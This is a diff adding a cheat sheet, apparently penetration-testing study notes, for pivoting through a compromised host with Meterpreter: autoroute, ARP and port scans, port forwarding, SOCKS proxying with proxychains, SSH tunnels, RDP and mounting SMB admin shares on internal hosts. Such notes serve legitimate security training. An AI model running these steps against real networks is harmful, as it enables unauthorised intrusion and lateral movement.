@@ -1,0 +1,152 @@
+
+
+##############################################################################################################
+
+	1) IDENTIFYING LOCAL NETWORKS
+	+-------------------------------+
+	| In Meterpreter Session	| 
+ 	+-------------------------------+
+ 	
+ 	shell
+ 	ipconfig 
+	 
+	run get_local_subnets 
+	run autoroute -s <local_subnet_ip>/<cidr> 
+	run autoroute -p  <——  to check 
+	background 
+
+		OR 
+
+ 	use autoroute 
+ 	set session <id> 
+	run 
+ 
+##############################################################################################################
+
+	2) HOST IDENTIFICATION 
+	+----------------------------------+
+	| If Already Known, Skip This Step |
+	| Perform ARP scan 		   |
+	| Perform nmap scan 		   |
+	+----------------------------------+
+	 
+	search gather/arp_scanner 
+	set rhosts <local_subnet_ip>/<cidr> 
+	sets session <id> 
+	run 
+
+		OR (NOT RELIABLE OPTION)
+ 	
+ 	db_nmap <local_subnet_ip>/<cidr> -sn 
+
+##############################################################################################################
+
+	3) PORT ENUMERATION  
+	+-----------------------+
+	| Scanning Open Ports	|
+	+-----------------------+
+ 	
+ 	use portscan/tcp  
+ 	set rhosts <ip_internal_host>   <- host ip identied 
+	set ports 21,22,445,80,443,8080,3389 
+	run 
+
+##############################################################################################################
+
+	4) PRE EXPLOIT 
+   	+-----------------------+
+	| Service Enumeration	|
+	+-----------------------+
+ 
++===========================Port-Forwarding========================================== 
+| 	
+| 	sessions  <id> 
+| 	portfwd add -l 8888 -p <port-open-ip-internal-host> -r  <ip_internal_host> 
+| 	background 
+| 	db_nmap -sV  localhost 
+|
+|  	Find Vulnerable exploits 
+|
++============================Using Socks Proxy========================================
+|	
+|		Check Proxychains Version: 
+| 		cat /etc/proxychains4.conf 
+|		cat /etc/proxychains.conf 
+|
+|	+===========NO WEB SERVER=================================================		 
+|	|
+| 	| use socks_proxy
+| 	| set SRVPORT <port_in_last_line> 
+| 	| set VERSION <version_in_last_line> 
+| 	| run -J
+|	|
+|	|	New Tab 
+|	|
+|	| proxychains nmap <ip_internal_host> -Pn -sT 
+|	| Every command line has to start with: 
+|	| proxychains 
+|	| Find Vulnerability 
+|	|
+| 	+==========WEB SERVER PRESENT=============================================== 
+|	|
+|	|	Enumerate Via RDP 
+| 	|	
+| 	|	xfreerdp /u:<username> /p:<pass> /v:<firstIP> 
+| 	|	Open Web Browser 
+| 	|	Paste internal IP   
+|	|	
+|	| 		OR 
+|	| 
+|	|	Enumerate & Exploit 
+|	| 
+|	|	use  socks_proxy  
+|	|	set srvhost <yourIp> 
+|	|	srvport set 1080 
+|	|	set version 5 
+|	|	run -j 
+|	|	Open Firefox 
+|	|	Settings 
+|	|	Search proxy 
+|	|	Set manual proxy configuration 
+|	|	Socks Host: <myIp> port 1080 
+|	|	Hit Ok 
+|	|	Paste IP_Internal in URL 
+|	|
+|	+================SSH PRESENT=================================================
+|	| 
+|	| With login to ssh server (Already Logged Into SSH Server Via Target 1): 
+|	|  	ifconfig 
+|	| If there is another interface, then there is another host in another network 
+|	| 	exit  
+|	| 	ssh <user>@<ip_public> -D <proxy_port> 
+| 	| Using same credentials as external ssh server 
+|	| New Tab 
+|	|	netstat -antp 
+|	|	proxychains nmap -sT -Pn <ip_internal> 
+|	| Find Vulnerability  
+|	| Every command line has to start with: proxychains 
+|	|
+| 	+=================SMB PRESENT==================================================
+|	|
+| 	| sessions 1 
+| 	| shell  
+| 	| net view <ip_internal_host> 
+| 	| 	
+| 	| 		EXAMPLE:
+|	| net use D: \\<ip_internal_host>\<sharename> 
+| 	| net use K: \\<ip_internal_host>\K$ 
+|	|	
+|	| exit 
+|	| y 
+|	| cd / 
+|	| cd D: 
+|	| ls 
+|	| cd K:  
+|	| ls 
+|	|
+|	+===============================================================================
+|
++=============================================================================================== 
+
+##############################################################################################################
+
